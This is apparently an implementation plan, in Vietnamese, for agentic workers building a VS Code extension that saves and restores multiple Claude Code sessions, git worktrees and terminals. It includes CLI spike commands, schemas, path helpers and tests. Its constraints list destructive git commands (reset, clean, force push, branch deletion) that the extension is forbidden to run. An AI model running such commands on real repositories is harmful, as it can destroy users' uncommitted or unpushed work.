# AI Coding Workspace Session Manager — MVP Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Một VS Code extension lưu topology của nhiều Claude Code session (terminal + git worktree + session ID + vai trò) vào manifest và dựng lại toàn bộ bằng một lệnh.

**Architecture:** Core thuần TypeScript không import `vscode` (manifest, git, agent, events, index) chứa gần hết logic và được unit-test bằng vitest; lớp vỏ VS Code (terminal, trust, ui) mỏng. Mọi thứ đặc thù Claude Code nằm trong `ClaudeCodeAdapter`. Restore = tạo terminal thật của VS Code rồi `sendText` dòng lệnh `claude`; trạng thái đọc từ `claude agents --json` chứ không parse stdout.

**Tech Stack:** TypeScript 5.x, esbuild, zod, yaml, vitest, @vscode/test-cli + @vscode/test-electron. Không native dependency.

Spec nguồn: `docs/superpowers/specs/2026-08-09-ai-workspace-session-manager-design.md`

## Global Constraints

- `engines.vscode`: `^1.90.0`. Node 20+.
- Không thêm bất kỳ native dependency nào (không `node-pty`).
- Các thư mục `src/manifest/`, `src/git/`, `src/agent/`, `src/events/`, `src/index/` **không được** import `vscode`. Có test tự động kiểm tra điều này (Task 2).
- Extension **không bao giờ** chạy `git reset`, `git clean`, `git checkout`, `git stash`, `git worktree remove`, `git branch -d/-D`, `git push --force`, `git merge`, `git rebase`. Có test tự động kiểm tra (Task 7).
- Đường dẫn lưu trong manifest luôn dùng dấu `/` (posix), kể cả trên Windows.
- Tên session (`name`) là địa chỉ peer của Claude Code, phải duy nhất trên toàn máy.
- Mọi văn bản hiển thị cho người dùng viết bằng tiếng Việt có dấu đầy đủ.
- Commit message tiếng Việt, kết thúc bằng:
  ```
  Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
  ```

---

## File Structure

| File | Trách nhiệm |
|---|---|
| `package.json`, `tsconfig.json`, `vitest.config.ts`, `esbuild.mjs` | Build & test harness |
| `src/extension.ts` | activate/deactivate, nối dây |
| `src/events/bus.ts` | EventBus typed in-process |
| `src/manifest/schema.ts` | Zod schema cho `workspace.yaml` và `state.json` |
| `src/manifest/paths.ts` | Phân giải đường dẫn, đổi qua lại tương đối ↔ tuyệt đối |
| `src/manifest/store.ts` | Đọc/ghi hai file trên |
| `src/agent/types.ts` | `AgentAdapter`, `RunningSession`, `LaunchSpec` |
| `src/agent/quote.ts` | Quoting theo shell |
| `src/agent/registry.ts` | Parse `claude agents --json` |
| `src/agent/claude.ts` | `ClaudeCodeAdapter` |
| `src/git/porcelain.ts` | Parse `git worktree list --porcelain` |
| `src/git/worktree.ts` | Phân loại trạng thái worktree, dựng lệnh `git worktree add` |
| `src/index/store.ts` | Index workspace toàn cục |
| `src/workspace/restore.ts` | Điều phối restore (thuần, nhận cổng qua tham số) |
| `src/workspace/manager.ts` | Kết nối restore với VS Code |
| `src/trust/store.ts` | Trust store cho `startupCommand` |
| `src/terminal/manager.ts` | Tạo và theo dõi terminal |
| `src/ui/tree.ts` | TreeDataProvider sidebar |
| `src/ui/commands.ts` | Đăng ký lệnh |
| `test/unit/*.test.ts` | Unit test (vitest) |
| `test/integration/git.test.ts` | Test git thật trên repo tạm |
| `test/vscode/smoke.test.ts` | Test trong Extension Host |
| `docs/manual-verification.md` | Checklist kiểm thử tay |

---

### Task 1: Spike — chốt ba câu hỏi còn mở

Không code sản phẩm. Ba câu hỏi ở §10 của spec quyết định API của Task 9 và Task 10, phải trả lời trước.

**Files:**
- Create: `docs/superpowers/spikes/2026-08-09-claude-cli-behaviour.md`

- [ ] **Step 1: Kiểm tra `--resume` có nhận kèm `-n` không**

```powershell
mkdir $env:TEMP\wss-spike; cd $env:TEMP\wss-spike; git init
$id = [guid]::NewGuid().ToString()
claude --session-id $id -p "tra loi dung chu: OK"
claude agents --json | ConvertFrom-Json | Where-Object { $_.sessionId -eq $id }
claude --resume $id -n "spike-renamed" -p "tra loi dung chu: OK2"
claude agents --json | ConvertFrom-Json | Where-Object { $_.sessionId -eq $id }
```

Ghi lại: lệnh `--resume ... -n ...` chạy được hay báo lỗi; nếu chạy được thì `name` trong registry có đổi thành `spike-renamed` không.

- [ ] **Step 2: Kiểm tra hành vi khi `--resume` một uuid không tồn tại**

```powershell
claude --resume 00000000-0000-4000-8000-000000000000 -p "hi"
echo "exit=$LASTEXITCODE"
```

Ghi lại exit code và thông báo lỗi — Task 13 cần phân biệt "resume hỏng" với "claude không có trong PATH".

- [ ] **Step 3: Kiểm tra quoting trên PowerShell**

```powershell
claude --session-id ([guid]::NewGuid().ToString()) -n 'Tên có dấu và khoảng trắng' -p "ok"
claude agents --json | ConvertFrom-Json | Select-Object name
```

Ghi lại: nháy đơn PowerShell có giữ nguyên chuỗi tiếng Việt không, tên hiển thị trong registry có đúng không.

- [ ] **Step 4: Tìm cách đặt inbound policy từ ngoài**

```powershell
claude --help | Select-String -Pattern 'peer|inbound|policy|coordinator'
Get-ChildItem "$env:USERPROFILE\.claude\settings.json" | Get-Content
```

Ghi lại kết luận: có cờ CLI/khoá settings nào đặt được `accept|hold|refuse` không. Nếu không có → ghi rõ "không đặt được từ ngoài; MVP dừng ở việc đặt đúng `--name`".

- [ ] **Step 5: Viết tài liệu spike**

Tạo `docs/superpowers/spikes/2026-08-09-claude-cli-behaviour.md` với 4 mục tương ứng 4 bước trên, mỗi mục gồm: lệnh đã chạy, output thật (dán nguyên), kết luận một câu. Nếu kết luận nào khác giả định trong spec, thêm mục "Ảnh hưởng tới plan" nêu rõ task nào phải sửa.

- [ ] **Step 6: Dọn và commit**

```bash
rm -rf "$TEMP/wss-spike"
git add docs/superpowers/spikes/
git commit -m "docs: spike xác minh hành vi Claude Code CLI

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 2: Scaffold dự án + hàng rào kiến trúc

**Files:**
- Create: `package.json`, `tsconfig.json`, `vitest.config.ts`, `esbuild.mjs`, `.vscodeignore`
- Create: `src/extension.ts`
- Test: `test/unit/architecture.test.ts`

**Interfaces:**
- Produces: script `npm test` (vitest), `npm run build` (esbuild), `npm run watch`.

- [ ] **Step 1: Tạo `package.json`**

```json
{
  "name": "ai-workspace-session-manager",
  "displayName": "AI Workspace Session Manager",
  "description": "Lưu và khôi phục workspace gồm nhiều terminal, git worktree và Claude Code session",
  "version": "0.0.1",
  "publisher": "bigdatacloud",
  "license": "MIT",
  "repository": { "type": "git", "url": "https://github.com/bigdatacloud/vscode-workspace-saver.git" },
  "engines": { "vscode": "^1.90.0", "node": ">=20" },
  "categories": ["Other"],
  "main": "./dist/extension.js",
  "activationEvents": [],
  "contributes": {
    "commands": [
      { "command": "aiWorkspace.newWorkspace", "title": "AI Workspace: New Workspace" }
    ]
  },
  "scripts": {
    "build": "node esbuild.mjs",
    "watch": "node esbuild.mjs --watch",
    "typecheck": "tsc --noEmit",
    "test": "vitest run",
    "test:watch": "vitest"
  },
  "devDependencies": {
    "@types/node": "^20.14.0",
    "@types/vscode": "^1.90.0",
    "esbuild": "^0.23.0",
    "typescript": "^5.5.0",
    "vitest": "^2.0.0"
  },
  "dependencies": {
    "yaml": "^2.5.0",
    "zod": "^3.23.0"
  }
}
```

- [ ] **Step 2: Tạo `tsconfig.json`**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "Node16",
    "moduleResolution": "Node16",
    "lib": ["ES2022"],
    "strict": true,
    "noUncheckedIndexedAccess": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "outDir": "out",
    "rootDir": "."
  },
  "include": ["src", "test", "esbuild.mjs"]
}
```

- [ ] **Step 3: Tạo `esbuild.mjs`**

```js
import * as esbuild from 'esbuild';

const watch = process.argv.includes('--watch');
const ctx = await esbuild.context({
  entryPoints: ['src/extension.ts'],
  bundle: true,
  outfile: 'dist/extension.js',
  external: ['vscode'],
  format: 'cjs',
  platform: 'node',
  target: 'node20',
  sourcemap: true,
  minify: !watch,
});

if (watch) { await ctx.watch(); console.log('watching...'); }
else { await ctx.rebuild(); await ctx.dispose(); }
```

- [ ] **Step 4: Tạo `vitest.config.ts`**

```ts
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    include: ['test/unit/**/*.test.ts', 'test/integration/**/*.test.ts'],
    environment: 'node',
  },
});
```

- [ ] **Step 5: Viết test hàng rào kiến trúc (test này sẽ FAIL trước khi có src)**

Tạo `test/unit/architecture.test.ts`. Bộ phát hiện import vscode phải bắt được cả import tĩnh
(`from 'vscode'`, kể cả `import type`), `require('vscode')`, lẫn import động
(`import('vscode')` / `await import('vscode')`) — vì import động chính là cách một implementer
ở task sau có thể vô tình lách hàng rào mà test vẫn xanh. Bộ phát hiện được tách thành hàm riêng
trong file test, và có một test thứ hai kiểm chứng hàm đó trên dữ liệu inline (bắt đủ 4 dạng nêu
trên, không báo động giả với chuỗi/đường dẫn chỉ trông giống 'vscode' như `'vscode-languageserver'`
hay `from './vscode-helpers'`, hay chữ 'vscode' xuất hiện trong comment):

```ts
import { describe, it, expect } from 'vitest';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join } from 'node:path';

const PURE_DIRS = ['manifest', 'git', 'agent', 'events', 'index'];

function walk(dir: string): string[] {
  const out: string[] = [];
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    if (statSync(full).isDirectory()) out.push(...walk(full));
    else if (full.endsWith('.ts')) out.push(full);
  }
  return out;
}

/**
 * Kiểm tra một đoạn mã nguồn có import module 'vscode' hay không, dưới bất kỳ hình thức nào:
 * import tĩnh (`from 'vscode'`, bao gồm cả `import type`), `require('vscode')`,
 * hoặc import động (`import('vscode')` / `await import('vscode')`).
 * KHÔNG được báo động giả với các chuỗi/đường dẫn chỉ trông giống 'vscode'
 * (vd 'vscode-languageserver', './vscode-helpers') hay chữ 'vscode' xuất hiện trong comment.
 */
function chuaImportVscode(source: string): boolean {
  const laImportTinh = /from\s+['"]vscode['"]/.test(source);
  const laRequire = /require\(\s*['"]vscode['"]\s*\)/.test(source);
  const laImportDong = /import\(\s*['"]vscode['"]\s*\)/.test(source);
  return laImportTinh || laRequire || laImportDong;
}

describe('hàng rào kiến trúc', () => {
  it('các module core không được import vscode', () => {
    const offenders: string[] = [];
    for (const dir of PURE_DIRS) {
      for (const file of walk(join('src', dir))) {
        const src = readFileSync(file, 'utf8');
        if (chuaImportVscode(src)) {
          offenders.push(file);
        }
      }
    }
    expect(offenders).toEqual([]);
  });

  it('hàm chuaImportVscode bắt đủ mọi hình thức import vscode và không báo động giả', () => {
    // Phải bắt được — mọi hình thức import/require module 'vscode', kể cả import động.
    expect(chuaImportVscode(`import * as vscode from 'vscode';`)).toBe(true);
    expect(chuaImportVscode(`const v = await import("vscode");`)).toBe(true);
    expect(chuaImportVscode(`import type {X} from 'vscode'`)).toBe(true);
    expect(chuaImportVscode(`const v = require('vscode')`)).toBe(true);

    // Không được báo động giả — chuỗi/đường dẫn chỉ trông giống 'vscode', hoặc chữ 'vscode' trong comment.
    expect(chuaImportVscode(`const x = 'vscode-languageserver';`)).toBe(false);
    expect(chuaImportVscode(`// nói về vscode trong comment`)).toBe(false);
    expect(chuaImportVscode(`import { helper } from './vscode-helpers';`)).toBe(false);
  });
});
```

- [ ] **Step 6: Chạy test, xác nhận FAIL**

Run: `npm install && npm test`
Expected: FAIL — `ENOENT ... src/manifest` (chưa có thư mục).

- [ ] **Step 7: Tạo khung tối thiểu để test pass**

Tạo `src/extension.ts`:

```ts
import * as vscode from 'vscode';

export function activate(context: vscode.ExtensionContext): void {
  context.subscriptions.push(
    vscode.commands.registerCommand('aiWorkspace.newWorkspace', async () => {
      await vscode.window.showInformationMessage('AI Workspace: chưa cài đặt.');
    }),
  );
}

export function deactivate(): void {}
```

Tạo file giữ chỗ cho từng thư mục core để hàng rào có cái mà quét — mỗi file một export thật, không phải file rỗng:

`src/events/bus.ts`:
```ts
export type EventName =
  | 'SessionStarting' | 'SessionStarted' | 'SessionFailed' | 'SessionExited'
  | 'SessionStatusChanged' | 'WorktreeMissing' | 'WorkspaceOpened' | 'WorkspaceClosed';
```

`src/manifest/schema.ts`, `src/git/porcelain.ts`, `src/agent/types.ts`, `src/index/store.ts`: mỗi file tạm thời chứa `export const PLACEHOLDER = true;` — các task sau sẽ thay bằng nội dung thật.

- [ ] **Step 8: Chạy test và typecheck, xác nhận PASS**

Run: `npm test && npm run typecheck && npm run build`
Expected: test PASS, tsc không lỗi, sinh ra `dist/extension.js`.

- [ ] **Step 9: Commit**

```bash
git add -A
git commit -m "chore: scaffold extension + hàng rào kiến trúc core không import vscode

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 3: Schema manifest và state

**Files:**
- Modify: `src/manifest/schema.ts` (thay placeholder)
- Test: `test/unit/manifest-schema.test.ts`

**Interfaces:**
- Produces:
  - `ManifestSchema`, `type Manifest`
  - `SessionSchema`, `type SessionSpec`
  - `StateSchema`, `type WorkspaceState`, `type SessionState`
  - `type SessionStatus = 'busy' | 'idle' | 'blocked' | 'offline' | 'error'`

- [ ] **Step 1: Viết test**

Tạo `test/unit/manifest-schema.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { ManifestSchema, StateSchema } from '../../src/manifest/schema';

const VALID = {
  version: 1,
  workspace: { name: 'ERP Development Team' },
  project: { root: '.' },
  sessions: [
    {
      key: 'coordinator',
      name: 'ERP-Coordinator',
      role: 'coordinator',
      worktree: { path: '../erp-coordinator', branch: 'main' },
      terminal: { name: 'Coordinator' },
      startupCommand: null,
      agent: 'claude',
    },
  ],
};

describe('ManifestSchema', () => {
  it('chấp nhận manifest hợp lệ', () => {
    expect(ManifestSchema.parse(VALID).sessions[0]!.key).toBe('coordinator');
  });

  it('điền mặc định cho các trường vắng mặt', () => {
    const parsed = ManifestSchema.parse({
      version: 1,
      workspace: { name: 'W' },
      sessions: [{ key: 'a', name: 'A', terminal: { name: 'A' } }],
    });
    expect(parsed.project.root).toBe('.');
    expect(parsed.sessions[0]!.role).toBe('developer');
    expect(parsed.sessions[0]!.worktree).toBeNull();
    expect(parsed.sessions[0]!.startupCommand).toBeNull();
    expect(parsed.sessions[0]!.agent).toBe('claude');
  });

  it('từ chối key trùng nhau', () => {
    const bad = { ...VALID, sessions: [VALID.sessions[0], VALID.sessions[0]] };
    expect(() => ManifestSchema.parse(bad)).toThrow(/key bị trùng/);
  });

  it('từ chối name trùng nhau', () => {
    const bad = {
      ...VALID,
      sessions: [VALID.sessions[0], { ...VALID.sessions[0], key: 'other' }],
    };
    expect(() => ManifestSchema.parse(bad)).toThrow(/name bị trùng/);
  });

  it('từ chối key không phải slug', () => {
    const bad = { ...VALID, sessions: [{ ...VALID.sessions[0], key: 'Có Dấu' }] };
    expect(() => ManifestSchema.parse(bad)).toThrow();
  });

  it('từ chối version khác 1', () => {
    expect(() => ManifestSchema.parse({ ...VALID, version: 2 })).toThrow();
  });
});

describe('StateSchema', () => {
  it('chấp nhận state hợp lệ', () => {
    const parsed = StateSchema.parse({
      version: 1,
      sessions: {
        coordinator: {
          sessionId: '639a2ba8-e4f0-4e0b-917c-6ab773c8a922',
          pid: 12028,
          lastStatus: 'idle',
          lastActiveAt: 1786254024591,
        },
      },
    });
    expect(parsed.sessions.coordinator!.pid).toBe(12028);
  });

  it('mặc định sessions rỗng', () => {
    expect(StateSchema.parse({ version: 1 }).sessions).toEqual({});
  });

  it('từ chối sessionId không phải uuid', () => {
    expect(() =>
      StateSchema.parse({
        version: 1,
        sessions: { a: { sessionId: 'khong-phai-uuid', lastActiveAt: 1 } },
      }),
    ).toThrow();
  });
});
```

- [ ] **Step 2: Chạy test, xác nhận FAIL**

Run: `npx vitest run test/unit/manifest-schema.test.ts`
Expected: FAIL — `ManifestSchema` không tồn tại.

- [ ] **Step 3: Cài đặt schema**

Thay toàn bộ `src/manifest/schema.ts`:

```ts
import { z } from 'zod';

export const SESSION_KEY_RE = /^[a-z0-9][a-z0-9-]*$/;

export const WorktreeSchema = z.object({
  path: z.string().min(1),
  branch: z.string().min(1),
});

export const SessionSchema = z.object({
  key: z.string().regex(SESSION_KEY_RE, 'key phải là slug chữ thường, số và dấu gạch ngang'),
  name: z.string().min(1),
  role: z.string().min(1).default('developer'),
  worktree: WorktreeSchema.nullable().default(null),
  terminal: z.object({ name: z.string().min(1) }),
  startupCommand: z.string().nullable().default(null),
  agent: z.literal('claude').default('claude'),
});

export const ManifestSchema = z
  .object({
    version: z.literal(1),
    workspace: z.object({ name: z.string().min(1) }),
    project: z.object({ root: z.string().min(1).default('.') }).default({ root: '.' }),
    sessions: z.array(SessionSchema).default([]),
  })
  .superRefine((value, ctx) => {
    const seenKeys = new Set<string>();
    const seenNames = new Set<string>();
    for (const [i, session] of value.sessions.entries()) {
      if (seenKeys.has(session.key)) {
        ctx.addIssue({
          code: z.ZodIssueCode.custom,
          path: ['sessions', i, 'key'],
          message: `key bị trùng: ${session.key}`,
        });
      }
      seenKeys.add(session.key);
      if (seenNames.has(session.name)) {
        ctx.addIssue({
          code: z.ZodIssueCode.custom,
          path: ['sessions', i, 'name'],
          message: `name bị trùng: ${session.name}`,
        });
      }
      seenNames.add(session.name);
    }
  });

export const SESSION_STATUSES = ['busy', 'idle', 'blocked', 'offline', 'error'] as const;
export type SessionStatus = (typeof SESSION_STATUSES)[number];

export const SessionStateSchema = z.object({
  sessionId: z.string().uuid(),
  pid: z.number().int().nullable().default(null),
  lastStatus: z.enum(SESSION_STATUSES).default('offline'),
  lastActiveAt: z.number().int(),
});

export const StateSchema = z.object({
  version: z.literal(1),
  sessions: z.record(z.string(), SessionStateSchema).default({}),
});

export type Worktree = z.infer<typeof WorktreeSchema>;
export type SessionSpec = z.infer<typeof SessionSchema>;
export type Manifest = z.infer<typeof ManifestSchema>;
export type SessionState = z.infer<typeof SessionStateSchema>;
export type WorkspaceState = z.infer<typeof StateSchema>;
```

- [ ] **Step 4: Chạy test, xác nhận PASS**

Run: `npx vitest run test/unit/manifest-schema.test.ts`
Expected: 9 test PASS.

- [ ] **Step 5: Commit**

```bash
git add src/manifest/schema.ts test/unit/manifest-schema.test.ts
git commit -m "feat(manifest): schema zod cho workspace.yaml và state.json

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 4: Phân giải đường dẫn

**Files:**
- Create: `src/manifest/paths.ts`
- Test: `test/unit/manifest-paths.test.ts`

**Interfaces:**
- Consumes: không
- Produces:
  - `manifestDir(projectRoot: string): string`
  - `manifestFilePath(projectRoot: string): string`
  - `stateFilePath(projectRoot: string): string`
  - `resolveProjectRoot(manifestFile: string, declaredRoot: string): string`
  - `resolveWorktreePath(projectRoot: string, storedPath: string): string`
  - `toStoredPath(projectRoot: string, absolutePath: string): string`

- [ ] **Step 1: Viết test**

Tạo `test/unit/manifest-paths.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import * as path from 'node:path';
import {
  manifestDir, manifestFilePath, stateFilePath,
  resolveProjectRoot, resolveWorktreePath, toStoredPath,
} from '../../src/manifest/paths';

const ROOT = path.resolve('/projects/erp');

describe('đường dẫn manifest', () => {
  it('manifestDir nằm trong .ai-workspace', () => {
    expect(manifestDir(ROOT)).toBe(path.join(ROOT, '.ai-workspace'));
  });

  it('manifestFilePath và stateFilePath', () => {
    expect(manifestFilePath(ROOT)).toBe(path.join(ROOT, '.ai-workspace', 'workspace.yaml'));
    expect(stateFilePath(ROOT)).toBe(path.join(ROOT, '.ai-workspace', 'state.json'));
  });

  it('resolveProjectRoot giải "." thành thư mục cha của .ai-workspace', () => {
    const file = path.join(ROOT, '.ai-workspace', 'workspace.yaml');
    expect(resolveProjectRoot(file, '.')).toBe(ROOT);
  });

  it('resolveProjectRoot giải root tương đối lên trên', () => {
    const file = path.join(ROOT, 'sub', '.ai-workspace', 'workspace.yaml');
    expect(resolveProjectRoot(file, '..')).toBe(ROOT);
  });
});

describe('đường dẫn worktree', () => {
  it('giải đường dẫn tương đối ra tuyệt đối', () => {
    expect(resolveWorktreePath(ROOT, '../erp-coordinator'))
      .toBe(path.resolve(ROOT, '../erp-coordinator'));
  });

  it('giữ nguyên đường dẫn tuyệt đối đã lưu', () => {
    const abs = path.resolve('/elsewhere/wt');
    expect(resolveWorktreePath(ROOT, abs)).toBe(abs);
  });

  it('resolveWorktreePath với "." trả về project root', () => {
    expect(resolveWorktreePath(ROOT, '.')).toBe(ROOT);
  });

  it('toStoredPath luôn dùng dấu gạch chéo xuôi', () => {
    const abs = path.resolve(ROOT, '../erp-coordinator');
    expect(toStoredPath(ROOT, abs)).toBe('../erp-coordinator');
  });

  it('toStoredPath cho thư mục con', () => {
    const abs = path.join(ROOT, 'worktrees', 'qc');
    expect(toStoredPath(ROOT, abs)).toBe('worktrees/qc');
  });

  it('toStoredPath cho đường dẫn xa nhưng cùng ổ đĩa', () => {
    const abs = path.resolve(ROOT, '../..', 'totally', 'other');
    const stored = toStoredPath(ROOT, abs);
    expect(stored.startsWith('..')).toBe(true);
    expect(stored.replace(/\//g, path.sep)).not.toContain('/');
  });

  it.runIf(process.platform === 'win32')('toStoredPath khác ổ đĩa trả về tuyệt đối với dấu /', () => {
    const rootDrive = path.resolve(ROOT)[0];
    const otherDrive = rootDrive === 'C' || rootDrive === 'c' ? 'D' : 'C';
    const abs = path.resolve(`${otherDrive}:\\totally\\other\\place`);

    const stored = toStoredPath(ROOT, abs);

    // Kiểm tra: trả về tuyệt đối và dùng dấu /
    expect(path.isAbsolute(stored.replace(/\//g, path.sep))).toBe(true);
    expect(stored).not.toContain('\\');

    // Kiểm tra round-trip
    expect(resolveWorktreePath(ROOT, stored)).toBe(abs);
  });

  it('round-trip: toStoredPath rồi resolveWorktreePath ra lại đúng chỗ cũ', () => {
    const abs = path.resolve(ROOT, '../erp-coordinator');
    expect(resolveWorktreePath(ROOT, toStoredPath(ROOT, abs))).toBe(abs);
  });
});
```

- [ ] **Step 2: Chạy test, xác nhận FAIL**

Run: `npx vitest run test/unit/manifest-paths.test.ts`
Expected: FAIL — module không tồn tại.

- [ ] **Step 3: Cài đặt**

Tạo `src/manifest/paths.ts`:

```ts
import * as path from 'node:path';

export const MANIFEST_DIR_NAME = '.ai-workspace';
export const MANIFEST_FILE_NAME = 'workspace.yaml';
export const STATE_FILE_NAME = 'state.json';

export function manifestDir(projectRoot: string): string {
  return path.join(projectRoot, MANIFEST_DIR_NAME);
}

export function manifestFilePath(projectRoot: string): string {
  return path.join(manifestDir(projectRoot), MANIFEST_FILE_NAME);
}

export function stateFilePath(projectRoot: string): string {
  return path.join(manifestDir(projectRoot), STATE_FILE_NAME);
}

/** `manifestFile` là <root>/.ai-workspace/workspace.yaml; `declaredRoot` là project.root trong manifest. */
export function resolveProjectRoot(manifestFile: string, declaredRoot: string): string {
  const anchor = path.dirname(path.dirname(path.resolve(manifestFile)));
  return path.resolve(anchor, declaredRoot);
}

export function resolveWorktreePath(projectRoot: string, storedPath: string): string {
  const native = storedPath.replace(/\//g, path.sep);
  return path.isAbsolute(native) ? path.resolve(native) : path.resolve(projectRoot, native);
}

/** Trả về dạng lưu trong manifest: tương đối so với projectRoot, dùng dấu `/`. */
export function toStoredPath(projectRoot: string, absolutePath: string): string {
  const rel = path.relative(path.resolve(projectRoot), path.resolve(absolutePath));
  if (rel === '' ) return '.';
  if (path.isAbsolute(rel)) return path.resolve(absolutePath).replace(/\\/g, '/');
  return rel.replace(/\\/g, '/');
}
```

- [ ] **Step 4: Chạy test, xác nhận PASS**

Run: `npx vitest run test/unit/manifest-paths.test.ts`
Expected: 12 test PASS (bao gồm test Windows-only để kiểm tra khác ổ đĩa).

- [ ] **Step 5: Commit**

```bash
git add src/manifest/paths.ts test/unit/manifest-paths.test.ts
git commit -m "feat(manifest): phân giải đường dẫn manifest và worktree

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 5: Đọc/ghi manifest và state

**Files:**
- Create: `src/manifest/store.ts`
- Test: `test/unit/manifest-store.test.ts`

**Interfaces:**
- Consumes: `ManifestSchema`, `StateSchema`, `Manifest`, `WorkspaceState` (Task 3); `manifestFilePath`, `stateFilePath`, `manifestDir` (Task 4)
- Produces:
  - `readManifest(projectRoot: string): Promise<Manifest>`
  - `writeManifest(projectRoot: string, manifest: Manifest): Promise<void>`
  - `readState(projectRoot: string): Promise<WorkspaceState>`
  - `writeState(projectRoot: string, state: WorkspaceState): Promise<void>`
  - `class ManifestError extends Error` với `readonly issues: string[]`

- [ ] **Step 1: Viết test**

Tạo `test/unit/manifest-store.test.ts`:

```ts
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, readFileSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { readManifest, writeManifest, readState, writeState, ManifestError } from '../../src/manifest/store';
import type { Manifest } from '../../src/manifest/schema';

let root: string;
beforeEach(() => { root = mkdtempSync(join(tmpdir(), 'wss-')); });
afterEach(() => { rmSync(root, { recursive: true, force: true }); });

const MANIFEST: Manifest = {
  version: 1,
  workspace: { name: 'ERP Development Team' },
  project: { root: '.' },
  sessions: [{
    key: 'coordinator', name: 'ERP-Coordinator', role: 'coordinator',
    worktree: { path: '../erp-coordinator', branch: 'main' },
    terminal: { name: 'Coordinator' }, startupCommand: null, agent: 'claude',
  }],
};

describe('manifest store', () => {
  it('ghi rồi đọc lại ra đúng nội dung cũ', async () => {
    await writeManifest(root, MANIFEST);
    expect(await readManifest(root)).toEqual(MANIFEST);
  });

  it('ghi kèm .ai-workspace/.gitignore loại state.json', async () => {
    await writeManifest(root, MANIFEST);
    const ignore = readFileSync(join(root, '.ai-workspace', '.gitignore'), 'utf8');
    expect(ignore).toContain('state.json');
  });

  it('ném ManifestError kèm mô tả khi yaml sai schema', async () => {
    mkdirSync(join(root, '.ai-workspace'), { recursive: true });
    const file = join(root, '.ai-workspace', 'workspace.yaml');
    writeFileSync(file, 'version: 2\nworkspace:\n  name: X\n');
    try {
      await readManifest(root);
      expect.fail('phải ném ManifestError');
    } catch (error) {
      expect(error).toBeInstanceOf(ManifestError);
      if (error instanceof ManifestError) {
        expect(error.issues).not.toHaveLength(0);
        expect(error.issues.some((issue) => issue.includes('version'))).toBe(true);
        expect(error.message).toContain(file);
      }
    }
  });

  it('ném ManifestError khi yaml hỏng cú pháp', async () => {
    mkdirSync(join(root, '.ai-workspace'), { recursive: true });
    const file = join(root, '.ai-workspace', 'workspace.yaml');
    writeFileSync(file, 'version: [1\n');
    try {
      await readManifest(root);
      expect.fail('phải ném ManifestError');
    } catch (error) {
      expect(error).toBeInstanceOf(ManifestError);
      if (error instanceof ManifestError) {
        expect(error.issues).not.toHaveLength(0);
        expect(error.message).toContain(file);
      }
    }
  });

  it('readState trả state rỗng khi chưa có file', async () => {
    expect(await readState(root)).toEqual({ version: 1, sessions: {} });
  });

  it('readState trả state rỗng khi file hỏng thay vì ném lỗi', async () => {
    mkdirSync(join(root, '.ai-workspace'), { recursive: true });
    writeFileSync(join(root, '.ai-workspace', 'state.json'), '{ khong phai json');
    expect(await readState(root)).toEqual({ version: 1, sessions: {} });
  });

  it('ghi rồi đọc lại state', async () => {
    const state = {
      version: 1 as const,
      sessions: {
        coordinator: {
          sessionId: '639a2ba8-e4f0-4e0b-917c-6ab773c8a922',
          pid: 12028, lastStatus: 'idle' as const, lastActiveAt: 1786254024591,
        },
      },
    };
    await writeState(root, state);
    expect(await readState(root)).toEqual(state);
  });

  it('chi tiết lỗi tên session trùng nhau', async () => {
    mkdirSync(join(root, '.ai-workspace'), { recursive: true });
    const yamlWithDuplicateName = `version: 1
workspace:
  name: ERP Team
sessions:
  - key: s1
    name: Duplicate Name
    terminal: { name: S1 }
  - key: s2
    name: Duplicate Name
    terminal: { name: S2 }
`;
    const file = join(root, '.ai-workspace', 'workspace.yaml');
    writeFileSync(file, yamlWithDuplicateName);
    try {
      await readManifest(root);
      expect.fail('phải ném ManifestError');
    } catch (error) {
      expect(error).toBeInstanceOf(ManifestError);
      if (error instanceof ManifestError) {
        expect(error.issues).not.toHaveLength(0);
        expect(error.issues.some((issue) => issue.includes('name'))).toBe(true);
        expect(error.message).toContain(file);
      }
    }
  });
});
```

Lưu ý về test "state hỏng": `state.json` là dữ liệu chạy, mất được — hỏng thì coi như chưa có, không được làm chết luồng restore. Manifest thì ngược lại: hỏng phải báo lỗi rõ chứ không được đoán.

- [ ] **Step 2: Chạy test, xác nhận FAIL**

Run: `npx vitest run test/unit/manifest-store.test.ts`
Expected: FAIL — module không tồn tại.

- [ ] **Step 3: Cài đặt**

Tạo `src/manifest/store.ts`:

```ts
import { promises as fs } from 'node:fs';
import { parse as parseYaml, stringify as stringifyYaml } from 'yaml';
import { ManifestSchema, StateSchema, type Manifest, type WorkspaceState } from './schema';
import { manifestDir, manifestFilePath, stateFilePath } from './paths';

export class ManifestError extends Error {
  constructor(message: string, readonly issues: string[] = []) {
    super(message);
    this.name = 'ManifestError';
  }
}

const EMPTY_STATE: WorkspaceState = { version: 1, sessions: {} };

export async function readManifest(projectRoot: string): Promise<Manifest> {
  const file = manifestFilePath(projectRoot);
  let raw: string;
  try {
    raw = await fs.readFile(file, 'utf8');
  } catch {
    throw new ManifestError(`Không đọc được manifest: ${file}`);
  }

  let data: unknown;
  try {
    data = parseYaml(raw);
  } catch (error) {
    throw new ManifestError(`YAML sai cú pháp: ${file}`, [String(error)]);
  }

  const parsed = ManifestSchema.safeParse(data);
  if (!parsed.success) {
    const issues = parsed.error.issues.map((i) => `${i.path.join('.') || '(gốc)'}: ${i.message}`);
    throw new ManifestError(`Manifest sai schema: ${file}`, issues);
  }
  return parsed.data;
}

